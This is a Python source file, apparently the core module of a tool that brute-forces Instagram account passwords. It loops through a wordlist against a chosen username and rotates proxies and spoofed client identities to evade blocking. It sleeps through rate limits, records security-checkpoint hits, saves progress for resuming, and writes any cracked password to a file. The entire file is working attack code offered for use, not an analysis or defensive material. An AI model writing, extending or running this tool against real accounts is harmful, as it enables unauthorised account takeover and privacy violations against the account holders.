#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brute — live progress + auto proxy failover."""

import json
import os
import sys
import time
import random
from .api import InstagramAPI
from .proxy import ProxyManager
from .banner import info, ok, warn, err, C


class BruteEngine:
    def __init__(
        self,
        username,
        wordlist_path,
        output_dir="output",
        delay_min=3.0,
        delay_max=5.0,
        proxy=None,
        proxy_file=None,
        resume=False,
    ):
        self.username = username.strip().lstrip("@")
        self.wordlist_path = wordlist_path
        self.output_dir = output_dir
        self.delay_min = float(delay_min)
        self.delay_max = float(delay_max)
        self.proxy_mgr = ProxyManager(
            proxy_file=proxy_file,
            proxy_url=proxy,
        )
        if self.proxy_mgr.count:
            info("Validating proxies...")
            self.proxy_mgr.validate_all()
        self.api = InstagramAPI()
        self._found = None
        self._tried = set()
        self._cursor = 0
        self._checkpoints = []
        base = os.path.join(output_dir, self.username)
        os.makedirs(base, exist_ok=True)
        self.progress_file = os.path.join(base, "progress.json")
        self.found_file = os.path.join(base, "found.txt")
        self.checkpoint_file = os.path.join(base, "checkpoints.txt")
        if resume:
            self._load()

    def _load(self):
        try:
            with open(self.progress_file, "r", encoding="utf-8") as f:
                d = json.load(f)
            self._tried = set(d.get("tried", []))
            self._cursor = int(d.get("cursor", 0))
            info(
                f"Resume cursor={self._cursor} "
                f"tried={len(self._tried)}"
            )
        except Exception:
            pass

    def _save(self):
        try:
            with open(self.progress_file, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "tried": list(self._tried)[-20000:],
                        "cursor": self._cursor,
                        "found": self._found,
                    },
                    f,
                )
        except Exception:
            pass

    def _progress(self, i, total, password, start, extra=""):
        elapsed = max(time.time() - start, 0.001)
        rate = i / elapsed
        left = max(total - i, 0)
        eta = int(left / rate) if rate > 0 else 0
        h, r = divmod(eta, 3600)
        m, s = divmod(r, 60)
        eta_s = f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
        pct = (i / total) * 100 if total else 0
        bar_len = 18
        filled = int(bar_len * i / total) if total else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        pw = (
            password
            if len(password) <= 26
            else password[:23] + "..."
        )
        line = (
            f"\r{C.C}[{i}/{total}]{C.E} "
            f"{C.G}{bar}{C.E} "
            f"{pct:5.1f}% | {rate:4.2f}/s | "
            f"ETA {eta_s} | "
            f"pwd: {C.Y}{pw}{C.E}{extra}   "
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def run(self):
        passwords = []
        try:
            with open(
                self.wordlist_path, "r", encoding="utf-8", errors="ignore"
            ) as f:
                for line in f:
                    pw = line.strip()
                    if pw and pw not in self._tried:
                        passwords.append(pw)
        except FileNotFoundError:
            err(f"Wordlist not found: {self.wordlist_path}")
            return None

        if not passwords:
            warn("No passwords left to test")
            return None

        total = len(passwords)
        print()
        info(f"Target     : @{self.username}")
        info(f"Passwords  : {total}")
        info(f"Already    : {len(self._tried)}")
        info(
            f"Delay      : {self.delay_min}-{self.delay_max}s | "
            f"proxies alive: {self.proxy_mgr.alive_count}"
        )
        print()

        start = time.time()
        done = 0
        try:
            for password in passwords:
                if self._found:
                    break

                self._cursor += 1
                done += 1
                self._tried.add(password)

                purl = self.proxy_mgr.get_next()

                max_retries = 3
                for attempt in range(max_retries):
                    self.api.set_proxy(purl if purl else None)

                    if done % 5 == 0 or attempt > 0:
                        self.api._rotate_identity()

                    result = self.api.try_login(self.username, password)
                    extra = ""

                    if result.get("success"):
                        self._found = password
                        print()
                        ok(f"FOUND → {password}")
                        break

                    st = result.get("status", "")

                    if st in ("timeout", "connection_error"):
                        if purl:
                            self.proxy_mgr.mark_dead(purl)
                            warn(f"Proxy dead: {purl}")
                        purl = self.proxy_mgr.get_next()
                        if purl and attempt < max_retries - 1:
                            extra = f" | retry {attempt+2}/{max_retries}"
                            self._progress(
                                done, total, password, start, extra
                            )
                            time.sleep(random.uniform(1, 2))
                            continue
                        else:
                            extra = " | all proxies dead — DIRECT"
                            self.api.set_proxy(None)
                            result = self.api.try_login(
                                self.username, password
                            )
                            st = result.get("status", "")
                            break

                    if st == "checkpoint":
                        self._checkpoints.append(password)
                        try:
                            with open(
                                self.checkpoint_file, "a", encoding="utf-8"
                            ) as cf:
                                cf.write(password + "\n")
                        except Exception:
                            pass
                        extra = f" | {C.Y}CHECKPOINT{C.E}"
                    elif st == "rate_limited":
                        extra = f" | {C.R}RATE-LIMIT{C.E}"
                        self._progress(
                            done, total, password, start, extra
                        )
                        time.sleep(random.uniform(45, 100))
                    elif st == "invalid_user":
                        print()
                        err("Username invalid — stop")
                        break

                    if purl and st not in ("timeout", "connection_error"):
                        self.proxy_mgr.mark_alive(purl)

                    break

                else:
                    extra = " | no proxy worked"

                if result.get("status") == "invalid_user":
                    break

                self._progress(done, total, password, start, extra)

                if done % 20 == 0:
                    self._save()
                    self.proxy_mgr.show_stats()

                time.sleep(random.uniform(self.delay_min, self.delay_max))

        except KeyboardInterrupt:
            print()
            warn("Interrupted — progress saved")
            self._save()
            return self._found

        print()
        self._save()
        elapsed = time.time() - start
        print(f"{C.C}{'═' * 48}{C.E}")
        print(f"  Done @{self.username} | tried {done} | {elapsed:.0f}s")
        print(f"  Found: {self._found or 'none'}")
        print(f"  Checkpoints: {len(self._checkpoints)}")
        self.proxy_mgr.show_stats()
        print(f"{C.C}{'═' * 48}{C.E}")

        if self._found:
            with open(self.found_file, "w", encoding="utf-8") as f:
                f.write(self._found)
            ok(f"Saved → {self.found_file}")
        return self._found
